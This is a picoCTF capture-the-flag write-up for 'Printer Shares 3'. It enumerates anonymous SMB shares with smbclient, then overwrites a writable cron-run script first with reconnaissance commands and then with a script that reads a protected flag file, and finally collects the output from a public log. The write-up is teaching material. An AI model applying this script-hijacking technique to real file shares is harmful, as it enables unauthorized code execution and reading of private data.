---
title: "Printer Shares 3"
description: "picoCTF Printer Shares 3 writeup discovering a writable cron job script on a printer share and exploiting it for remote code execution to capture the flag."
category: "picoCTF - General Skills"
tags: ["picoctf", "general-skills"]
published: true
---
# Printer Shares 3

## Challenge

**Category:** General Skills  
**Name:** Printer Shares 3

**Prompt:**

> I accidentally left the debug script in place… Well, I think that's fine - No one could possibly access my super secure directory
> two printers are on `56098`, one private, one public.
> you can try `$ nc -vz dolphin-cove.picoctf.net 56098`

Additional hint:

> a suspicious script is running every minute, this script runs every minute, you might need to wait for a while

## Goal

Access the private printer data indirectly through the public share and recover the flag.

## Initial idea

This challenge is clearly related to the earlier SMB printer share tasks:

- there are two shares: one public and one private
- a script runs every minute
- a debug script was “left in place”

That strongly suggests:

1. the public share is reachable anonymously
2. the public share contains a script
3. that script is being executed by cron
4. if the share is writable, we can replace the script and make cron read the private directory for us

## Step 1: Verify the port is open

```bash
nc -vz dolphin-cove.picoctf.net 56098
```

Result:

```text
dolphin-cove.picoctf.net [3.13.34.175] 56098 open
```

## Step 2: Enumerate SMB shares

Because this is a printer/share challenge, try SMB enumeration first:

```bash
smbclient -N -L //dolphin-cove.picoctf.net/ -p 56098
```

Explanation:

- `smbclient` is an SMB client
- `-N` means anonymous login
- `-L` lists shares
- `-p 56098` uses the custom challenge port

Result:

```text
Sharename       Type      Comment
---------       ----      -------
shares          Disk      Public Share With Guests
secure-shares   Disk      Printer for internal usage only
IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
```

Important finding:

- `shares` is public
- `secure-shares` is the protected target

## Step 3: Inspect the public share

List files inside `shares`:

```bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'ls'
```

Result:

```text
script.sh
cron.log
```

This matches the hint exactly:

- `script.sh` is likely the debug script
- `cron.log` probably stores the output from the minute-based cron job

## Step 4: Download the script and the log

```bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get script.sh'
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
```

Read them:

```bash
cat script.sh
cat cron.log
```

Contents:

```bash
#!/bin/bash
# this script runs every minute
echo "Health Check: $(date)"
```

And the log looked like:

```text
Health Check: Wed Mar 11 10:37:01 UTC 2026
Health Check: Wed Mar 11 10:38:01 UTC 2026
```

This proves:

- the script is actually being executed
- its output is being written into `cron.log`

## Step 5: Check whether the public share is writable

If we can overwrite `script.sh`, we can turn cron into a file-reading primitive.

Test write access:

```bash
printf 'test-write\n' > /tmp/printer3_test.txt
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_test.txt test-write.txt; ls'
```

Result:

- upload succeeded
- the file appeared in the share

That is the key vulnerability:

- anonymous users can modify a script that a privileged scheduled task runs

## Step 6: First-stage payload to discover the private path

Before directly reading the flag, use a small reconnaissance script:

```bash
cat > /tmp/printer3_probe.sh <<'EOF'
#!/bin/bash
id
pwd
find / -maxdepth 4 -name flag.txt 2>/dev/null
EOF
```

Upload it over the existing `script.sh`:

```bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_probe.sh script.sh'
```

Then wait a bit more than one minute and pull the log again:

```bash
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
cat cron.log
```

New log output:

```text
uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
/challenge/shares
/challenge/secure-shares/flag.txt
```

This tells us:

- the cron job runs as the `challenge` user
- it executes from `/challenge/shares`
- the private flag file is at `/challenge/secure-shares/flag.txt`

## Step 7: Second-stage payload to print the flag

Now replace the script with a direct `cat`:

```bash
cat > /tmp/printer3_flag.sh <<'EOF'
#!/bin/bash
cat /challenge/secure-shares/flag.txt
EOF
```

Upload it:

```bash
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/printer3_flag.sh script.sh'
```

Wait for the next cron execution:

```bash
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
tail -n 20 cron.log
```

The flag appeared in the public log:

```text
picoCTF{<redacted>}
```

## Flag

```text
picoCTF{<redacted>}
```

## Why this works

This is a classic insecure scheduled-task / writable-script issue.

The intended private directory was protected from direct anonymous browsing, but that protection failed because:

1. the public share was writable
2. a cron job executed a script from that writable location
3. the cron output was written back into a public log file

That gave us an indirect path:

- overwrite script
- wait for cron
- read output from log

So the “private” share was effectively readable through the public one.

## Minimal solve path

```bash
nc -vz dolphin-cove.picoctf.net 56098
smbclient -N -L //dolphin-cove.picoctf.net/ -p 56098
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'ls'
printf '#!/bin/bash\ncat /challenge/secure-shares/flag.txt\n' > /tmp/script.sh
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'put /tmp/script.sh script.sh'
sleep 70
smbclient -N //dolphin-cove.picoctf.net/shares -p 56098 -c 'get cron.log'
cat cron.log
```

## Takeaway

Protecting a directory is meaningless if a scheduled task with access to that directory executes attacker-controlled code from a writable location. The real vulnerability here is not the private share itself, but the trust boundary broken by the cron-executed debug script.
